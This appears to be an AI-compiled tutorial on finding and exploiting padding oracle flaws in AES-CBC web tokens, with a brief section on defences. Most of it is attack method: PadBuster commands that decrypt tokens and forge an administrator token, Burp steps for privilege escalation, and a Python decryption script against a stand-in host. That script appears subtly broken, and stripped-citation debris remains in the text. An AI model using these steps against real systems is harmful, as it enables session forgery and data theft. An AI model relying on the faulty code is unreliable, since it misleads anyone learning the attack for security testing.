# Complete Methodology for Exploiting Padding Oracle Vulnerabilities

## Understanding the Vulnerability

A padding oracle attack exploits how a server responds when it receives ciphertext with incorrect padding . When a web application uses CBC mode encryption (like AES-CBC) with PKCS#7 padding, it must validate the padding during decryption. If the server returns different error messages or response times for invalid padding versus valid padding, it becomes an "oracle" that leaks information .

This vulnerability is not theoretical. In 2025, Google Chrome was found vulnerable to a padding oracle attack in its AppBound cookie encryption mechanism (CVE-2025-34091). Attackers could recover encrypted cookies by observing decryption failure behaviors in Windows Event Logs . Also in 2025, Mbed TLS disclosed CVE-2025-59438, where error reporting timing differences created a padding oracle in their CBC-PKCS7 implementation .


## How the Attack Works

The attack relies on the mathematical properties of CBC mode decryption. Here is the formula for CBC decryption :

```
Plaintext = Decrypt(Ciphertext) XOR PreviousCiphertext
```

When an attacker modifies a ciphertext block and sends it to the server, they can observe whether the resulting plaintext has valid padding. By systematically manipulating bytes and observing the oracle's responses, the attacker can calculate the intermediate state and ultimately recover the plaintext without knowing the encryption key .

The attack works block by block, byte by byte, requiring approximately 128-256 requests per byte of plaintext .


## Step-by-Step Testing Methodology

### Step 1: Identify Potential Targets

Look for encrypted parameters in:
- Session cookies
- Authentication tokens
- URL parameters
- Hidden form fields
- API request bodies

Common encoding formats include Base64, hexadecimal, and .NET UrlToken .

### Step 2: Manual Testing for Padding Oracle Behavior

Send modified ciphertexts and observe responses:

```bash
# Intercept a request with an encrypted token
# Modify the last byte of the ciphertext
# Send the request and compare responses
```

Indicators of padding oracle vulnerability :
- "Invalid padding" error messages
- "Padding error" or "Decryption failed" responses
- HTTP 500 errors that appear only with certain modifications
- Timing differences between valid and invalid padding responses
- Different HTTP status codes (200 vs 500) based on padding validity

### Step 3: Automated Detection with Burp Suite

Install Padding Oracle Hunter from the BApp Store :

1. Open Burp Suite
2. Go to Extender → BApp Store
3. Search for "Padding Oracle Hunter"
4. Click Install

**Prerequisites** :
- Jython standalone JAR file must be configured in Extender → Options → Python Environment

**Testing a Target** :

1. Capture a request containing encrypted data in Burp Suite
2. Right-click the request → Extensions → Padding Oracle Hunter → PKCS#7
3. In the extension tab, select the encrypted payload value in the Request window
4. Click "Select Payload" and choose the correct encoding (Base64 or Hex)
5. Click the "Test" button
6. Review the output window for vulnerability confirmation

The extension will provide a summary indicating whether the server is vulnerable and will identify valid and invalid padding responses automatically .

### Step 4: Exploitation Using PadBuster

PadBuster is a Perl script included in Kali Linux that automates padding oracle attacks . Install it with:

```bash
sudo apt install padbuster
```

**Decrypt an existing token** :

```bash
padbuster http://target.com/page.php "ENCRYPTED_TOKEN" 16 \
  -cookies "session=ENCRYPTED_TOKEN" \
  -error "Invalid padding"
```

**Parameters explained** :
- URL: The target endpoint
- EncryptedSample: The encrypted token value
- BlockSize: 8 for DES/3DES, 16 for AES
- -cookies: Cookie name and value containing the token
- -error: The exact error message indicating padding failure
- -encoding: 0=Base64, 1=Lower HEX, 2=Upper HEX

**Forge a new token with arbitrary data** :

```bash
padbuster http://target.com/page.php "ENCRYPTED_TOKEN" 16 \
  -cookies "session=ENCRYPTED_TOKEN" \
  -error "Invalid padding" \
  -plaintext 'user=administrator'
```

### Step 5: Exploitation Using Padding Oracle Hunter GUI

After confirming vulnerability with the Test button :

1. Copy the padding response string from the Output window
2. Paste it into the "Padding Response" textbox
3. Click "Decrypt" to recover the plaintext
4. Review the decrypted output to understand the token structure

**To create an admin token** :

1. Modify the plaintext value (e.g., change `"isAdmin":"False"` to `"isAdmin":"True"`)
2. Convert the new plaintext to hexadecimal
3. Paste the hex value into the "Plaintext" textbox
4. Click "Encrypt" to generate a new valid ciphertext
5. Replace the original token in your HTTP request with the new value
6. Send the request to verify privilege escalation

### Step 6: Exploitation Using Python (Manual Approach)

For custom automation or learning purposes, Python scripts can implement the attack directly :

```python
import base64
import requests

def padding_oracle(ciphertext):
    # Send ciphertext to target and return True if padding is valid
    response = requests.get(f"http://target.com/page?token={ciphertext}")
    return "Invalid padding" not in response.text

def decrypt_block(block, previous_block):
    intermediate = bytearray(16)
    plaintext = bytearray(16)
    
    for byte_pos in range(15, -1, -1):
        padding_value = 16 - byte_pos
        for guess in range(256):
            # Modify previous block at byte_pos
            test_block = bytearray(previous_block)
            test_block[byte_pos] = guess
            
            # Build ciphertext: test_block + original_block
            test_cipher = base64.b64encode(test_block + block)
            
            if padding_oracle(test_cipher):
                intermediate[byte_pos] = guess ^ padding_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ previous_block[byte_pos]
                # Update previous bytes for next iteration
                for k in range(byte_pos, 16):
                    test_block[k] = intermediate[k] ^ padding_value
                break
    return plaintext
```

## Real-World Attack Examples

### Example 1: Chrome AppBound Cookie Encryption Bypass (CVE-2025-34091)

In July 2025, researchers discovered that Google Chrome's cookie encryption could be bypassed using a padding oracle attack. Chrome uses dual-layer DPAPI encryption (user-level then SYSTEM-level) for cookie protection. The vulnerability existed because Windows DPAPI reports decryption failures via Event Logs, creating an observable oracle .

A local attacker could:
1. Send malformed ciphertexts to the Chrome elevation service
2. Distinguish between padding errors and MAC errors by monitoring Event Logs
3. Recover the SYSTEM-DPAPI encrypted key through repeated queries
4. Decrypt all stored cookies, bypassing Chrome's AppBound protection

This affected Chrome version 127 and later, and also potentially other Chromium-based browsers .

### Example 2: Mbed TLS Timing Oracle (CVE-2025-59438)

In October 2025, Mbed TLS disclosed a padding oracle vulnerability in their CBC-PKCS7 implementation. The issue arose because error code translation from mbedtls_cipher_finish() to PSA error codes was not constant-time. A local unprivileged attacker could observe which error was raised by timing shared resources like code cache or branch predictors .

This affected all Mbed TLS versions up to 3.6.4 and was fixed in version 3.6.5 .

### Example 3: CTF Challenge - The Seer

In a typical capture-the-flag scenario, participants encounter a service that encrypts data with AES-CBC and reveals padding validity. The attack proceeds as follows :

1. Retrieve the encrypted token from the service
2. Divide the ciphertext into 16-byte blocks
3. For each byte position in each block, brute force values 0-255
4. Observe which guesses produce valid padding responses
5. Calculate intermediate state using XOR operations
6. Recover plaintext block by block

This demonstrates the complete attack in a controlled environment .

## Detection and Mitigation for Defenders

### How to Detect Padding Oracle Vulnerabilities

During code review or security testing, look for :

- Use of CBC mode with PKCS#7 padding
- Different error messages for padding failures vs other failures
- Timing differences in decryption responses
- Lack of authenticated encryption (no MAC/GCM mode)

### Mitigation Strategies

1. **Use authenticated encryption modes**: GCM (Galois/Counter Mode) or OCB (Offset Codebook Mode) are not vulnerable to padding oracle attacks 

2. **Implement Encrypt-then-MAC**: Add a Message Authentication Code (HMAC) to verify ciphertext integrity before decryption 

3. **Return generic error messages**: Do not distinguish between padding errors, decryption failures, or other errors 

4. **Implement rate limiting**: Padding oracle attacks require hundreds or thousands of requests. Limiting request rates can block the attack 

5. **Update vulnerable libraries**: Apply patches for known vulnerabilities like CVE-2025-59438 

## Tools Reference

| Tool | Purpose | Installation |
|------|---------|--------------|
| PadBuster | CLI padding oracle exploitation | `sudo apt install padbuster`  |
| Padding Oracle Hunter | Burp Suite GUI extension | BApp Store  |
| Padre | Concurrent Go implementation | GitHub [citation:original] |
| RustPad | Rust implementation | GitHub [citation:original] |

## Key Takeaways

- Padding oracle attacks allow decryption and encryption without knowing the key
- The vulnerability exists when servers leak padding validity information
- Modern real-world examples exist (Chrome CVE-2025-34091, Mbed TLS CVE-2025-59438)
- Automated tools make exploitation practical
- Mitigation requires switching to authenticated encryption or implementing Encrypt-then-MAC
